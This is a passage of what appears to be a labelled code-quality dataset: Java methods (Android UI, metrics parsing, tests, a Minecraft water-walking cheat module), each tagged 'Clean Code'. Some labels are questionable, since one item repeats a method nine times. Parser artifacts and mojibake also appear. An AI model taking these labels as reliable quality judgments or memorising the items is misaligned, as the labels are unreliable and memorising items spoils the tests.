 * @throws InvalidProtocolBufferException If the protobuf could not be parsed from the {@code message}.
 * @return The deserialized object.
 */
@SuppressWarnings({""unchecked"",""rawtypes""}) public static WeightedEnsembleModel<?> deserializeFromProto(int version,String className,Any message) throws InvalidProtocolBufferException {
  if (version < 0 || version > CURRENT_VERSION) {
    throw new IllegalArgumentException(""Unknown version "" + version + "", this class supports at most version ""+ CURRENT_VERSION);
  }
  WeightedEnsembleModelProto proto=message.unpack(WeightedEnsembleModelProto.class);
  ModelDataCarrier<? extends Output<?>> carrier=ModelDataCarrier.deserialize(proto.getMetadata());
  ModelProvenance prov=carrier.provenance();
  if (!(prov instanceof EnsembleModelProvenance)) {
    throw new IllegalStateException(""Invalid protobuf, the provenance was not an EnsembleModelProvenance. Found "" + prov);
  }
  EnsembleModelProvenance ensembleProvenance=(EnsembleModelProvenance)prov;
  ImmutableOutputInfo<? extends Output<?>> outputDomain=carrier.outputDomain();
  Class<? extends Output> outputClass=outputDomain.getOutput(0).getClass();
  EnsembleCombiner<?> combiner=EnsembleCombiner.deserialize(proto.getCombiner());
  if (!outputClass.equals(combiner.getTypeWitness())) {
    throw new IllegalStateException(""Invalid protobuf, combiner and output domain have a type mismatch, expected "" + outputClass + "" found ""+ combiner.getTypeWitness());
  }
  if (proto.getModelsCount() == 0) {
    throw new IllegalStateException(""Invalid protobuf, no models were found in the ensemble"");
  }
  if (proto.getModelsCount() != proto.getWeightsCount()) {
    throw new IllegalStateException(""Invalid protobuf, different numbers of models and weights were found, "" + proto.getModelsCount() + "" models, ""+ proto.getWeightsCount()+ "" weights"");
  }
  List<Model> models=new ArrayList<>(proto.getModelsCount());
  for (  ModelProto p : proto.getModelsList()) {
    Model model=Model.deserialize(p);
    if (model.validate(outputClass)) {
      models.add(model);
    }
 else {
      throw new IllegalStateException(""Invalid protobuf, output type of model '"" + model.toString() + ""' did not match expected ""+ outputClass);
    }
  }
  float[] weights=Util.toPrimitiveFloat(proto.getWeightsList());
  return new WeightedEnsembleModel(carrier.name(),ensembleProvenance,carrier.featureDomain(),outputDomain,models,combiner,weights);
}",0,Clean Code
"private void enrichHistogramValue(final Metric metric,final PrometheusMetric prometheusMetric){
  if (metric.getMetricPoint().getHistogramValue() == null) {
    metric.getMetricPoint().setHistogramValue(new HistogramValue());
  }
  final String metricName=prometheusMetric.getMetric().get(SystemMetricLabel.NAME.getLabelName());
  if (isSpecificSeries(metricName,CREATED)) {
    metric.getMetricPoint().getHistogramValue().setCreated(getTimestampValue(prometheusMetric.getValue().get(1)));
  }
 else   if (isSpecificSeries(metricName,COUNT)) {
    metric.getMetricPoint().getHistogramValue().setCount(getLongValue(prometheusMetric.getValue().get(1)));
  }
 else   if (isSpecificSeries(metricName,SUM)) {
    metric.getMetricPoint().getHistogramValue().setSum(getBigDecimalValue(prometheusMetric.getValue().get(1)));
  }
 else   if (isSpecificSeries(metricName,BUCKET)) {
    if (metric.getMetricPoint().getHistogramValue() == null) {
      metric.getMetricPoint().setHistogramValue(new HistogramValue());
    }
    if (CollectionUtils.isEmpty(metric.getMetricPoint().getHistogramValue().getBuckets())) {
      metric.getMetricPoint().getHistogramValue().setBuckets(new ArrayList<>());
    }
    final String bucketBound=prometheusMetric.getMetric().get(BUCKET_UPPER_BOUND.getLabelName());
    final Bucket bucket=new Bucket();
    bucket.setUpperBound(new BigDecimal(bucketBound));
    bucket.setCount(getLongValue(prometheusMetric.getValue().get(1)));
    metric.getMetricPoint().getHistogramValue().getBuckets().add(bucket);
  }
 else {
    throw new IllegalStateException(""Unknown metric for histogram type"");
  }
}",0,Clean Code
"private void updateTimestampAnimation(){
  if (timestamps == null || timestamps.isEmpty()) {
    return;
  }
  float progress=(pressed ? draggingThumbX : thumbX) / (float)(width - thumbWidth);
  int timestampIndex=-1;
  for (int i=timestamps.size() - 1; i >= 0; --i) {
    if (timestamps.get(i).first - 0.001f <= progress) {
      timestampIndex=i;
      break;
    }
  }
  if (timestampLabel == null) {
    timestampLabel=new StaticLayout[2];
  }
  float left=thumbWidth / 2f;
  float right=width - thumbWidth / 2f;
  float rightPadded=right;
  float width=Math.abs(left - rightPadded) - AndroidUtilities.dp(16 + 50);
  lastWidth=width;
  if (timestampIndex != currentTimestamp) {
    if (pressed && parentView != null) {
      try {
        parentView.performHapticFeedback(HapticFeedbackConstants.TEXT_HANDLE_MOVE,HapticFeedbackConstants.FLAG_IGNORE_VIEW_SETTING);
      }
 catch (      Exception ignore) {
      }
    }
    currentTimestamp=timestampIndex;
    if (currentTimestamp >= 0 && currentTimestamp < timestamps.size()) {
      onTimestampUpdate(timestamps.get(currentTimestamp).second);
    }
  }
  if (timestampChangeT < 1f) {
    long tx=Math.min(17,Math.abs(SystemClock.elapsedRealtime() - lastTimestampUpdate));
    float duration=timestamps.size() > 8 ? 160f : 220f;
    timestampChangeT=Math.min(timestampChangeT + tx / duration,1);
    if (parentView != null) {
      parentView.invalidate();
    }
    lastTimestampUpdate=SystemClock.elapsedRealtime();
  }
  if (timestampsAppearing < 1f) {
    long tx=Math.min(17,Math.abs(SystemClock.elapsedRealtime() - lastTimestampUpdate));
    timestampsAppearing=Math.min(timestampsAppearing + tx / 200f,1);
    if (parentView != null) {
      parentView.invalidate();
    }
    lastTimestampsAppearingUpdate=SystemClock.elapsedRealtime();
  }
}",0,Clean Code
"@Override public long getSupportedActions(){
  long result=0;
  long actions=mMediaController.getPlaybackState().getActions();
  if ((actions & PlaybackStateCompat.ACTION_PLAY_PAUSE) != 0) {
    result|=ACTION_PLAY_PAUSE;
  }
  if ((actions & PlaybackStateCompat.ACTION_SKIP_TO_NEXT) != 0) {
    result|=ACTION_SKIP_TO_NEXT;
  }
  if ((actions & PlaybackStateCompat.ACTION_SKIP_TO_PREVIOUS) != 0) {
    result|=ACTION_SKIP_TO_PREVIOUS;
  }
  if ((actions & PlaybackStateCompat.ACTION_FAST_FORWARD) != 0) {
    result|=ACTION_FAST_FORWARD;
  }
  if ((actions & PlaybackStateCompat.ACTION_REWIND) != 0) {
    result|=ACTION_REWIND;
  }
  return result;
}",0,Clean Code
"/** 
 * Subclass of BuilderBase should call this function to apply values.
 * @param action GuidedAction to apply BuilderBase values.
 */
protected final void applyValues(GuidedAction action){
  action.setId(mId);
  action.setLabel1(mTitle);
  action.setEditTitle(mEditTitle);
  action.setLabel2(mDescription);
  action.setEditDescription(mEditDescription);
  action.setIcon(mIcon);
  action.mIntent=mIntent;
  action.mEditable=mEditable;
  action.mInputType=mInputType;
  action.mDescriptionInputType=mDescriptionInputType;
  action.mAutofillHints=mAutofillHints;
  action.mEditInputType=mEditInputType;
  action.mDescriptionEditInputType=mDescriptionEditInputType;
  action.mActionFlags=mActionFlags;
  action.mCheckSetId=mCheckSetId;
  action.mSubActions=mSubActions;
}",0,Clean Code
"/** 
 * Constructor for the ViewHolder.
 * @param rootView The root View that this view holder will be attachedto.
 */
public ViewHolder(View rootView,Presenter detailsPresenter){
  super(rootView);
  mOverviewFrame=(FrameLayout)rootView.findViewById(R.id.details_frame);
  mOverviewView=(ViewGroup)rootView.findViewById(R.id.details_overview);
  mImageView=(ImageView)rootView.findViewById(R.id.details_overview_image);
  mRightPanel=(ViewGroup)rootView.findViewById(R.id.details_overview_right_panel);
  mDetailsDescriptionFrame=(FrameLayout)mRightPanel.findViewById(R.id.details_overview_description);
  mActionsRow=(HorizontalGridView)mRightPanel.findViewById(R.id.details_overview_actions);
  mActionsRow.setHasOverlappingRendering(false);
  mActionsRow.setOnScrollListener(mScrollListener);
  mActionsRow.setAdapter(mActionBridgeAdapter);
  mActionsRow.setOnChildSelectedListener(mChildSelectedListener);
  final int fadeLength=rootView.getResources().getDimensionPixelSize(R.dimen.lb_details_overview_actions_fade_size);
  mActionsRow.setFadingRightEdgeLength(fadeLength);
  mActionsRow.setFadingLeftEdgeLength(fadeLength);
  mDetailsDescriptionViewHolder=detailsPresenter.onCreateViewHolder(mDetailsDescriptionFrame);
  mDetailsDescriptionFrame.addView(mDetailsDescriptionViewHolder.view);
}
",0,Clean Code
"@EventHandler private void onTick(TickEvent.Post event){
  boolean bubbleColumn=isInBubbleColumn;
  isInBubbleColumn=false;
  if ((waterMode.get() == Mode.Bob && mc.player.isTouchingWater()) || (lavaMode.get() == Mode.Bob && mc.player.isInLava())) {
    double fluidHeight;
    if (mc.player.isInLava())     fluidHeight=mc.player.getFluidHeight(FluidTags.LAVA);
 else     fluidHeight=mc.player.getFluidHeight(FluidTags.WATER);
    double swimHeight=mc.player.getSwimHeight();
    if (mc.player.isTouchingWater() && fluidHeight > swimHeight) {
      ((LivingEntityAccessor)mc.player).swimUpwards(FluidTags.WATER);
    }
 else     if (mc.player.isOnGround() && fluidHeight <= swimHeight && ((LivingEntityAccessor)mc.player).getJumpCooldown() == 0) {
      mc.player.jump();
      ((LivingEntityAccessor)mc.player).setJumpCooldown(10);
    }
 else {
      ((LivingEntityAccessor)mc.player).swimUpwards(FluidTags.LAVA);
    }
  }
  if (mc.player.isTouchingWater() && !waterShouldBeSolid())   return;
  if (mc.player.isInSwimmingPose())   return;
  if (mc.player.isInLava() && !lavaShouldBeSolid())   return;
  if (bubbleColumn) {
    if (mc.options.jumpKey.isPressed() && mc.player.getVelocity().getY() < 0.11)     ((IVec3d)mc.player.getVelocity()).setY(0.11);
    return;
  }
  if (mc.player.isTouchingWater() || mc.player.isInLava()) {
    ((IVec3d)mc.player.getVelocity()).setY(0.11);
    tickTimer=0;
    return;
  }
  BlockState blockBelowState=mc.world.getBlockState(mc.player.getBlockPos().down());
  boolean waterLogger=false;
  try {
    waterLogger=blockBelowState.get(Properties.WATERLOGGED);
  }
 catch (  Exception ignored) {
  }
  if (tickTimer == 0)   ((IVec3d)mc.player.getVelocity()).setY(0.30);
 else   if (tickTimer == 1 && (blockBelowState == Blocks.WATER.getDefaultState() || blockBelowState == Blocks.LAVA.getDefaultState() || waterLogger))   ((IVec3d)mc.player.getVelocity()).setY(0);
  tickTimer++;
}",0,Clean Code
"public Criteria andGmtCreateBetween(Date value1,Date value2){
  addCriterion(""gmt_create between"",value1,value2,""gmtCreate"");
  return (Criteria)this;
}
public Criteria andGmtCreateBetween(Date value1,Date value2){
  addCriterion(""gmt_create between"",value1,value2,""gmtCreate"");
  return (Criteria)this;
}
public Criteria andGmtCreateBetween(Date value1,Date value2){
  addCriterion(""gmt_create between"",value1,value2,""gmtCreate"");
  return (Criteria)this;
}
public Criteria andGmtCreateBetween(Date value1,Date value2){
  addCriterion(""gmt_create between"",value1,value2,""gmtCreate"");
  return (Criteria)this;
}
public Criteria andGmtCreateBetween(Date value1,Date value2){
  addCriterion(""gmt_create between"",value1,value2,""gmtCreate"");
  return (Criteria)this;
}
public Criteria andGmtCreateBetween(Date value1,Date value2){
  addCriterion(""gmt_create between"",value1,value2,""gmtCreate"");
  return (Criteria)this;
}
public Criteria andGmtCreateBetween(Date value1,Date value2){
  addCriterion(""gmt_create between"",value1,value2,""gmtCreate"");
  return (Criteria)this;
}
public Criteria andGmtCreateBetween(Date value1,Date value2){
  addCriterion(""gmt_create between"",value1,value2,""gmtCreate"");
  return (Criteria)this;
}
public Criteria andGmtCreateBetween(Date value1,Date value2){
  addCriterion(""gmt_create between"",value1,value2,""gmtCreate"");
  return (Criteria)this;
}",0,Clean Code
"public void onContentViewSizeChanged(int w,int h,int oldw,int oldh){
  if (oldw == 0 || w != prevWidth) {
    initialHeight=h;
    prevWidth=w;
    onWidthChanged(w);
  }
  if (h > initialHeight) {
    initialHeight=h;
  }
  if (initialHeight != 0 && w == oldw) {
    keyboardHeight=initialHeight - h;
    if (keyboardHeight != 0) {
      DisplayMetrics dm=activity.getResources().getDisplayMetrics();
      activity.getSharedPreferences(""emoji"",Context.MODE_PRIVATE).edit().putInt(""kb_size"" + dm.widthPixels + ""_""+ dm.heightPixels,keyboardHeight).commit();
    }
    if (needShowOnHide && keyboardHeight == 0) {
      ((View)keyboardPopupView.getParent()).getViewTreeObserver().addOnPreDrawListener(new ViewTreeObserver.OnPreDrawListener(){
        @Override public boolean onPreDraw(){
          ((View)keyboardPopupView.getParent()).getViewTreeObserver().removeOnPreDrawListener(this);
          doShowKeyboardPopup();
          return false;
        }
      }
);
      needShowOnHide=false;
    }
    if (keyboardHeight > 0 && keyboardPopupView.getVisibility() == View.VISIBLE) {
      if (iconListener != null)       iconListener.onIconChanged(ICON_HIDDEN);
      ((View)keyboardPopupView.getParent()).getViewTreeObserver().addOnPreDrawListener(new ViewTreeObserver.OnPreDrawListener(){
        @Override public boolean onPreDraw(){
          ((View)keyboardPopupView.getParent()).getViewTreeObserver().removeOnPreDrawListener(this);
          keyboardPopupView.setVisibility(View.GONE);
          return false;
        }
      }
);
    }
  }
}",0,Clean Code
"@SuppressWarnings(""unchecked"") public static <T>T sendGETRequest(Main main,String requestID,String url,Map<String,String> params,int connectionTimeoutMS,int readTimeoutMS,Integer version,String cdiVersion,String rid) throws IOException, io.supertokens.test.httpRequest.HttpResponseException {
  StringBuilder paramBuilder=new StringBuilder();
  if (params != null) {
    for (    Map.Entry<String,String> entry : params.entrySet()) {
      paramBuilder.append(entry.getKey()).append(""="").append(URLEncoder.encode(entry.getValue(),StandardCharsets.UTF_8)).append(""&"");
    }
  }
  String paramsStr=paramBuilder.toString();
  if (!paramsStr.equals("""")) {
    paramsStr=paramsStr.substring(0,paramsStr.length() - 1);
    url=url + ""?"" + paramsStr;
  }
  URL obj=getURL(main,requestID,url);
  InputStream inputStream=null;
  HttpURLConnection con=null;
  try {
    con=(HttpURLConnection)obj.openConnection();
    con.setConnectTimeout(connectionTimeoutMS);
    con.setReadTimeout(readTimeoutMS + 1000);
    if (version != null) {
      con.setRequestProperty(""api-version"",version + """");
    }
    if (cdiVersion != null) {
      con.setRequestProperty(""cdi-version"",cdiVersion);
    }
    if (rid != null) {
      con.setRequestProperty(""rId"",rid);
    }
    int responseCode=con.getResponseCode();
    if (responseCode < STATUS_CODE_ERROR_THRESHOLD) {
      inputStream=con.getInputStream();
    }
 else {
      inputStream=con.getErrorStream();
    }
    StringBuilder response=new StringBuilder();
    try (BufferedReader in=new BufferedReader(new InputStreamReader(inputStream,StandardCharsets.UTF_8))){
      String inputLine;
      while ((inputLine=in.readLine()) != null) {
        response.append(inputLine);
      }
    }
     if (responseCode < STATUS_CODE_ERROR_THRESHOLD) {
      if (!isJsonValid(response.toString())) {
        return (T)response.toString();
      }
      return (T)(new JsonParser().parse(response.toString()));
    }
    throw new io.supertokens.test.httpRequest.HttpResponseException(responseCode,response.toString());
  }
  finally {
    if (inputStream != null) {
      inputStream.close();
    }
    if (con != null) {
      con.disconnect();
    }
  }
}",0,Clean Code
"TrackSelectionParameters(){
  this(null,null,0,false,0);
}
TrackSelectionParameters(@Nullable String preferredAudioLanguage,@Nullable String preferredTextLanguage,@C.RoleFlags int preferredTextRoleFlags,boolean selectUndeterminedTextLanguage,@C.SelectionFlags int disabledTextTrackSelectionFlags){
  this.preferredAudioLanguage=Util.normalizeLanguageCode(preferredAudioLanguage);
  this.preferredTextLanguage=Util.normalizeLanguageCode(preferredTextLanguage);
  this.preferredTextRoleFlags=preferredTextRoleFlags;
  this.selectUndeterminedTextLanguage=selectUndeterminedTextLanguage;
  this.disabledTextTrackSelectionFlags=disabledTextTrackSelectionFlags;
}
TrackSelectionParameters(Parcel in){
  this.preferredAudioLanguage=in.readString();
  this.preferredTextLanguage=in.readString();
  this.preferredTextRoleFlags=in.readInt();
  this.selectUndeterminedTextLanguage=Util.readBoolean(in);
  this.disabledTextTrackSelectionFlags=in.readInt();
}",0,Clean Code
"@SuppressWarnings(""unchecked"") public static <PR extends ProviderRegistration,AP extends AbstractProvider<PR>>AP getProvider(Class<AP> clazz,Function<PR,AP> valueSupplier,PR faker){
  Map<FakerContext,AbstractProvider<?>> map=PROVIDERS_MAP.get(clazz);
  if (map == null) {
synchronized (BaseFaker.class) {
      map=PROVIDERS_MAP.get(clazz);
      if (map == null) {
        PROVIDERS_MAP.put(clazz,new ConcurrentHashMap<>());
        map=PROVIDERS_MAP.get(clazz);
      }
    }
  }
  final AP result=(AP)map.get(faker.getContext());
  if (result == null) {
    final AP newMapping=valueSupplier.apply(faker);
    final String simpleName=clazz.getSimpleName();
    CLASSES.putIfAbsent(simpleName,new ConcurrentHashMap<>());
    Method[] methods=clazz.getMethods();
    Class newMappingClass=newMapping.getClass();
    METHODS.putIfAbsent(newMappingClass,new ConcurrentHashMap<>(methods.length));
    for (    Method method : methods) {
      if (method.getParameterCount() > 0)       continue;
      final String methodName=method.getName();
      Map<String,Method> methodMap=METHODS.get(newMappingClass);
      if (methodMap == null) {
synchronized (BaseFaker.class) {
          methodMap=METHODS.get(newMappingClass);
          if (methodMap == null) {
            METHODS.put(newMappingClass,new ConcurrentHashMap<>(newMappingClass.getMethods().length));
            methodMap=METHODS.get(newMappingClass);
          }
        }
      }
      methodMap.put(methodName,method);
    }
    map.putIfAbsent(faker.getContext(),newMapping);
    CLASSES.get(simpleName).put(faker.getContext(),newMapping);
    return newMapping;
  }
  return result;
}
public static AbstractProvider<?> getProvider(String className,FakerContext context){
  final Map<FakerContext,AbstractProvider<?>> map=CLASSES.get(className);
  if (map == null)   return null;
  return map.get(context);
}",0,Clean Code
"/** 
 * {@inheritDoc}
 */
public LayoutParams(Context c,AttributeSet attrs){
  super(c,attrs);
  TypedArray a=c.obtainStyledAttributes(attrs,R.styleable.lbBaseCardView_Layout);
  viewType=a.getInt(R.styleable.lbBaseCardView_Layout_layout_viewType,VIEW_TYPE_MAIN);
  a.recycle();
}
/** 
 * {@inheritDoc}
 */
public LayoutParams(int width,int height){
  super(width,height);
}
/** 
 * {@inheritDoc}
 */
public LayoutParams(ViewGroup.LayoutParams p){
  super(p);
}
/** 
 * Copy constructor. Clones the width, height, and View Type of the source.
 * @param source The layout params to copy from.
 */
public LayoutParams(LayoutParams source){
  super((ViewGroup.MarginLayoutParams)source);
  this.viewType=source.viewType;
}
public LayoutParams(Context c,AttributeSet attrs){
  super(c,attrs);
}
public LayoutParams(int width,int height){
  super(width,height);
}
public LayoutParams(MarginLayoutParams source){
  super(source);
}
public LayoutParams(ViewGroup.LayoutParams source){
  super(source);
}
public LayoutParams(RecyclerView.LayoutParams source){
  super(source);
}
public LayoutParams(LayoutParams source){
  super(source);
}
",0,Clean Code
"private int prctl(Emulator<?> emulator){
  RegisterContext context=emulator.getContext();
  int option=context.getIntArg(0);
  long arg2=context.getLongArg(1);
  if (log.isDebugEnabled()) {
    log.debug(""prctl option=0x{}, arg2=0x{}"",Integer.toHexString(option),Long.toHexString(arg2));
  }
switch (option) {
case PR_SET_NAME:
    Pointer threadName=context.getPointerArg(1);
  if (log.isDebugEnabled()) {
    log.debug(""prctl set thread name: {}"",threadName.getString(0));
  }
return 0;
case BIONIC_PR_SET_VMA:
Pointer addr=context.getPointerArg(2);
int len=context.getIntArg(3);
Pointer pointer=context.getPointerArg(4);
if (log.isDebugEnabled()) {
log.debug(""prctl set vma addr={}, len={}, pointer={}, name={}"",addr,len,pointer,pointer.getString(0));
}
return 0;
case PR_SET_PTRACER:
int pid=(int)arg2;
if (log.isDebugEnabled()) {
log.debug(""prctl set ptracer: {}"",pid);
}
return 0;
case PR_SET_NO_NEW_PRIVS:
case PR_SET_THP_DISABLE:
return 0;
}
throw new UnsupportedOperationException(""option="" + option);
}",0,Clean Code
"@Test public void test_queryUserInfoById(){
  String resource=""mybatis-config-datasource.xml"";
  Reader reader;
  try {
    reader=Resources.getResourceAsReader(resource);
    SqlSessionFactory sqlMapper=new SqlSessionFactoryBuilder().build(reader);
    SqlSession session=sqlMapper.openSession();
    try {
      User user=session.selectOne(""org.itstack.demo.design.dao.IUserDao.queryUserInfoById"",1L);
      logger.info(""娴嬭瘯缁撴灉锛歿}"",JSON.toJSONString(user));
    }
  finally {
      session.close();
      reader.close();
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
}",0,Clean Code
"@Override public String toString(){
  StringBuilder sb=new StringBuilder();
  if (!TextUtils.isEmpty(mLabel1)) {
    sb.append(mLabel1);
  }
  if (!TextUtils.isEmpty(mLabel2)) {
    if (!TextUtils.isEmpty(mLabel1)) {
      sb.append("" "");
    }
    sb.append(mLabel2);
  }
  if (mIcon != null && sb.length() == 0) {
    sb.append(""(action icon)"");
  }
  return sb.toString();
}",0,Clean Code
"@Override protected void onGetBaseViewLoc(int[] baseViewLoc){
  if (Arrays.equals(baseViewLoc,baseViewLocCache)) {
    return;
  }
  if (getDialogImpl() == null) {
    return;
  }
  Bitmap bkg=Bitmap.createBitmap(getDialogImpl().boxRoot.getWidth(),getDialogImpl().boxRoot.getHeight(),Bitmap.Config.ARGB_8888);
  Canvas canvas=new Canvas(bkg);
  int x=baseViewLoc[0] + baseViewLocationCoordinateCompensation[0];
  int y=baseViewLoc[1] + baseViewLocationCoordinateCompensation[1];
  int w=baseViewLoc[2] + baseViewLocationCoordinateCompensation[2];
  int h=baseViewLoc[3] + baseViewLocationCoordinateCompensation[3];
  int hW=w / 2;
  int hH=h / 2;
  if (stageLightPathStub != null && (stageLightPathStub.getX() != x || stageLightPathStub.getY() != y)) {
    RelativeLayout.LayoutParams rLp=(RelativeLayout.LayoutParams)stageLightPathStub.getLayoutParams();
    if (rLp == null) {
      rLp=new RelativeLayout.LayoutParams(w,h);
    }
 else {
      rLp.width=w;
      rLp.height=h;
    }
    stageLightPathStub.setLayoutParams(rLp);
    stageLightPathStub.setX(x);
    stageLightPathStub.setY(y);
  }
switch (stageLightType) {
case CIRCLE_OUTSIDE:
{
      int r=(int)Math.sqrt(hW * hW + hH * hH);
      canvas.drawCircle(x + hW,y + hH,r,getStageLightPaint());
    }
  break;
case CIRCLE_INSIDE:
{
  int r=Math.min(w,h) / 2;
  canvas.drawCircle(x + hW,y + hH,r,getStageLightPaint());
}
break;
case RECTANGLE:
{
canvas.drawRoundRect(new RectF(x,y,x + w,y + h),stageLightFilletRadius,stageLightFilletRadius,getStageLightPaint());
}
break;
case SQUARE_INSIDE:
{
int r=Math.min(w,h);
canvas.drawRoundRect(new RectF(x + hW - r / 2,y + hH - r / 2,x + hW - r / 2 + r,y + hH - r / 2 + r),stageLightFilletRadius,stageLightFilletRadius,getStageLightPaint());
}
break;
case SQUARE_OUTSIDE:
{
int r=Math.max(w,h);
canvas.drawRoundRect(new RectF(x + hW - r / 2,y + hH - r / 2,x + hW - r / 2 + r,y + hH - r / 2 + r),stageLightFilletRadius,stageLightFilletRadius,getStageLightPaint());
}
break;
}
stageLightPaint.setXfermode(null);
canvas.drawColor(maskColor == null ? getColor(R.color.black50) : maskColor,PorterDuff.Mode.SRC_OUT);
BitmapDrawable bkgDrawable=new BitmapDrawable(getResources(),bkg);
getDialogImpl().boxRoot.setBackground(bkgDrawable);
baseViewLocCache=Arrays.copyOf(baseViewLoc,4);
}",0,Clean Code
"@Test public void testReadBit(){
  VorbisBitArray bitArray=new VorbisBitArray(TestUtil.createByteArray(0x5c,0x50));
  assertThat(bitArray.readBit()).isFalse();
  assertThat(bitArray.readBit()).isFalse();
  assertThat(bitArray.readBit()).isTrue();
  assertThat(bitArray.readBit()).isTrue();
  assertThat(bitArray.readBit()).isTrue();
  assertThat(bitArray.readBit()).isFalse();
  assertThat(bitArray.readBit()).isTrue();
  assertThat(bitArray.readBit()).isFalse();
  assertThat(bitArray.readBit()).isFalse();
  assertThat(bitArray.readBit()).isFalse();
  assertThat(bitArray.readBit()).isFalse();
  assertThat(bitArray.readBit()).isFalse();
  assertThat(bitArray.readBit()).isTrue();
  assertThat(bitArray.readBit()).isFalse();
  assertThat(bitArray.readBit()).isTrue();
  assertThat(bitArray.readBit()).isFalse();
}",0,Clean Code
"public static Class<?>[] getClazzByArgs(Object[] args){
  Class<?>[] parameterTypes=new Class[args.length];
  for (int i=0; i < args.length; i++) {
    if (args[i] instanceof ArrayList) {
      parameterTypes[i]=List.class;
      continue;
    }
    if (args[i] instanceof LinkedList) {
      parameterTypes[i]=List.class;
      continue;
    }
    if (args[i] instanceof HashMap) {
      parameterTypes[i]=Map.class;
      continue;
    }
    if (args[i] instanceof Long) {
      parameterTypes[i]=long.class;
      continue;
    }
    if (args[i] instanceof Double) {
      parameterTypes[i]=double.class;
      continue;
    }
    if (args[i] instanceof TimeUnit) {
      parameterTypes[i]=TimeUnit.class;
      continue;
    }
    parameterTypes[i]=args[i].getClass();
  }
  return parameterTypes;
}",0,Clean Code
"/** 
 * 杩涘叆鍏捣瀹㈡埛鏁�(鎸夋棩鏈�)
 * @param reqVO 璇锋眰鍙傛暟
 * @return 缁熻鏁版嵁
 */
default List<CrmStatisticsPoolSummaryByDateRespVO> selectPoolCustomerPutCountByDate(CrmStatisticsCustomerReqVO reqVO){
  LocalDateTime currrentDate=LocalDateTimeUtil.beginOfDay(reqVO.getTimes()[0]);
  LocalDateTime endDate=LocalDateTimeUtil.endOfDay(reqVO.getTimes()[1]);
  List<CrmStatisticsPoolSummaryByDateRespVO> voList=new ArrayList<>();
  while (currrentDate.isBefore(endDate)) {
    voList.add(new CrmStatisticsPoolSummaryByDateRespVO().setTime(LocalDateTimeUtil.format(currrentDate,""yyyy-MM-dd"")).setCustomerPutCount(RandomUtil.randomInt(0,10)).setCustomerTakeCount(RandomUtil.randomInt(0,10)));
    currrentDate=currrentDate.plusDays(1);
  }
  return voList;
}",0,Clean Code
"private void startStreamAnimation(){
  cancelStreamAnimation();
  int pos=getStreamPosition();
  int totalLen=length();
  int animLen=totalLen - pos;
  if (animLen > 0) {
    if (mStreamingAnimation == null) {
      mStreamingAnimation=new ObjectAnimator();
      mStreamingAnimation.setTarget(this);
      mStreamingAnimation.setProperty(STREAM_POSITION_PROPERTY);
    }
    mStreamingAnimation.setIntValues(pos,totalLen);
    mStreamingAnimation.setDuration(STREAM_UPDATE_DELAY_MILLIS * animLen);
    mStreamingAnimation.start();
  }
}",0,Clean Code
"@Test public void testUpdateUserPassword_success(){
  AdminUserDO dbUser=randomAdminUserDO(o -> o.setPassword(""encode:tudou""));
  userMapper.insert(dbUser);
  Long userId=dbUser.getId();
  UserProfileUpdatePasswordReqVO reqVO=randomPojo(UserProfileUpdatePasswordReqVO.class,o -> {
    o.setOldPassword(""tudou"");
    o.setNewPassword(""yuanma"");
  }
);
  when(passwordEncoder.encode(anyString())).then((Answer<String>)invocationOnMock -> ""encode:"" + invocationOnMock.getArgument(0));
  when(passwordEncoder.matches(eq(reqVO.getOldPassword()),eq(dbUser.getPassword()))).thenReturn(true);
  userService.updateUserPassword(userId,reqVO);
  AdminUserDO user=userMapper.selectById(userId);
  assertEquals(""encode:yuanma"",user.getPassword());
}",0,Clean Code
"@Override public String evaluatePath(Path modulePath,ExecutorSpiOptions options){
  var allowedModules=options.getAllowedModules().stream().map(Pattern::compile).collect(Collectors.toList());
  var allowedResources=options.getAllowedResources().stream().map(Pattern::compile).collect(Collectors.toList());
  var securityManager=SecurityManagers.standard(allowedModules,allowedResources,SecurityManagers.defaultTrustLevels,options.getRootDir());
  var transformer=StackFrameTransformers.defaultTransformer;
  if (options.getRootDir() != null) {
    transformer=transformer.andThen(StackFrameTransformers.relativizeModuleUri(options.getRootDir().toUri()));
  }
  var resolver=new ModulePathResolver(options.getModulePath());
  var builder=EvaluatorBuilder.unconfigured().setStackFrameTransformer(transformer).setSecurityManager(securityManager).setHttpClient(getOrCreateHttpClient(options)).addResourceReader(ResourceReaders.environmentVariable()).addResourceReader(ResourceReaders.externalProperty()).addResourceReader(ResourceReaders.modulePath(resolver)).addResourceReader(ResourceReaders.pkg()).addResourceReader(ResourceReaders.projectpackage()).addResourceReader(ResourceReaders.file()).addResourceReader(ResourceReaders.http()).addResourceReader(ResourceReaders.https()).addModuleKeyFactory(ModuleKeyFactories.standardLibrary).addModuleKeyFactories(ModuleKeyFactories.fromServiceProviders()).addModuleKeyFactory(ModuleKeyFactories.modulePath(resolver)).addModuleKeyFactory(ModuleKeyFactories.pkg).addModuleKeyFactory(ModuleKeyFactories.projectpackage).addModuleKeyFactory(ModuleKeyFactories.file).addModuleKeyFactory(ModuleKeyFactories.http).addModuleKeyFactory(ModuleKeyFactories.genericUrl).setEnvironmentVariables(options.getEnvironmentVariables()).setExternalProperties(options.getExternalProperties()).setTimeout(options.getTimeout()).setOutputFormat(options.getOutputFormat()).setModuleCacheDir(options.getModuleCacheDir());
  if (options.getProjectDir() != null) {
    var project=Project.loadFromPath(options.getProjectDir().resolve(PKL_PROJECT_FILENAME));
    builder.setProjectDependencies(project.getDependencies());
  }
  try (var evaluator=builder.build()){
    return evaluator.evaluateOutputText(ModuleSource.path(modulePath));
  }
 catch (  PklException e) {
    throw new ExecutorSpiException(e.getMessage(),e.getCause());
  }
 finally {
    ModuleKeyFactories.closeQuietly(builder.getModuleKeyFactories());
  }
}
",0,Clean Code
"public static SQLQueryAdapter create(MySQLGlobalState globalState){
  return new MySQLAlterTable(globalState.getSchema()).create();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@12f1ecd1",0,Clean Code
"@Override public void run(SourceContext<T> ctx) throws Exception {
  Instant lastConsumeInstant=Instant.now();
  while (running) {
    ConsumerResult consumeResult=messagePullConsumer.getMessage();
    if (!consumeResult.isSuccess()) {
      if (!(consumeResult.getErrCode() == 400 || consumeResult.getErrCode() == 404 || consumeResult.getErrCode() == 405 || consumeResult.getErrCode() == 406 || consumeResult.getErrCode() == 407 || consumeResult.getErrCode() == 408)) {
        LOG.info(""Could not consume messages from tubemq (errcode: {}, "" + ""errmsg: {})."",consumeResult.getErrCode(),consumeResult.getErrMsg());
      }
      Duration idleTime=Duration.between(lastConsumeInstant,Instant.now());
      if (idleTime.compareTo(maxIdleTime) > 0) {
        ctx.markAsTemporarilyIdle();
      }
